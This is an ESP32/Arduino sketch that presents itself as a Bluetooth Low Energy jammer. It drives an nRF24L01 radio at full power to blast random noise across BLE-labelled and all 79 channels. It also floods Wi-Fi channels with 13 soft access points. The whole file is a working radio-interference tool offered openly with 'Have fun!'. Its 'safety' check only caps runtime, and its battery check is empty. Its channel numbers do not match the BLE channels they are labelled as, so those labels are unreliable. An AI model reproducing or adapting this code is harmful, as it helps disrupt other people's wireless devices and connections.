#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>
#include <WiFi.h>

#define CE_PIN 4
#define CSN_PIN 5
#define NRF_CHANNELS 79
#define MAX_RUNTIME_MS 3600000
#define BATTERY_CHECK_INTERVAL 5000

RF24 radio(CE_PIN, CSN_PIN);

const uint8_t BLE_PRIMARY_CHANNELS[] = {37, 38, 39, 12, 15, 16, 19, 20, 23, 24, 27, 28, 31, 32, 35, 36};
const uint8_t PRIMARY_CHANNEL_COUNT = sizeof(BLE_PRIMARY_CHANNELS) / sizeof(BLE_PRIMARY_CHANNELS[0]);
uint32_t startTime;
bool serialConnected = false;

void setup() {
  Serial.begin(115200);
  delay(100);
  serialConnected = Serial;
  setCpuFrequencyMhz(240);
  btStop();
  
  if (!radio.begin()) {
    if (serialConnected) Serial.println("Radio init failed");
    while (1);
  }
  
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false);
  radio.setAddressWidth(3);
  radio.setRetries(0, 0);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setPayloadSize(32);
  radio.disableDynamicPayloads();
  radio.setChannel(37);
  radio.maskIRQ(true, true, true);
  
  WiFi.mode(WIFI_AP_STA);
  for (int i = 1; i <= 13; i++) {
    WiFi.softAP(("MOG_" + String(i)).c_str(), nullptr, i, 0);
  }
  WiFi.scanNetworks(true, true);
  
  radio.powerUp();
  startTime = millis();
  
  if (serialConnected) {
    Serial.println("MOG-BLEJAMMER_V1 - made by @MOG-Developing");
    Serial.println("Have fun!");
  }
}

void jamBLE() {
  static uint8_t channelIndex = 0;
  static uint32_t lastChannelChange = 0;
  uint32_t currentTime = millis();
  
  if (currentTime - lastChannelChange > 1) {
    channelIndex = (channelIndex + 1) % PRIMARY_CHANNEL_COUNT;
    radio.setChannel(BLE_PRIMARY_CHANNELS[channelIndex]);
    lastChannelChange = currentTime;
    
    uint8_t noise[32];
    for (int i = 0; i < 32; i++) {
      noise[i] = random(256);
    }
    radio.writeFast(&noise, sizeof(noise));
    radio.writeFast(&noise, sizeof(noise));
  }
}

void checkSafety() {
  static uint32_t lastBatteryCheck = 0;
  uint32_t currentTime = millis();
  
  if (currentTime - startTime > MAX_RUNTIME_MS) {
    if (serialConnected) Serial.println("Safety shutdown: Max runtime exceeded");
    radio.powerDown();
    WiFi.mode(WIFI_OFF);
    while(1);
  }
  
  if (currentTime - lastBatteryCheck > BATTERY_CHECK_INTERVAL) {
    lastBatteryCheck = currentTime;
  }
}

void loop() {
  static uint32_t lastPrint = 0;
  static uint32_t lastFullScan = 0;
  static uint32_t packetCount = 0;
  
  jamBLE();
  packetCount++;
  checkSafety();
  
  if (serialConnected && millis() - lastPrint > 1000) {
    Serial.print("MOG-BLEJAMMER_V1 | CH:");
    Serial.print(radio.getChannel());
    Serial.print(" | PKTS:");
    Serial.print(packetCount * 2);
    Serial.print(" | CPU:");
    Serial.print(getCpuFrequencyMhz());
    Serial.println("MHz");
    packetCount = 0;
    lastPrint = millis();
  }
  
  if (millis() - lastFullScan > 30000) {
    for (uint8_t ch = 0; ch < NRF_CHANNELS; ch++) {
      radio.setChannel(ch);
      uint8_t noise[32];
      for (int i = 0; i < 32; i++) noise[i] = random(256);
      radio.writeFast(&noise, sizeof(noise));
      delayMicroseconds(200);
    }
    lastFullScan = millis();
  }
  
  delayMicroseconds(20);
}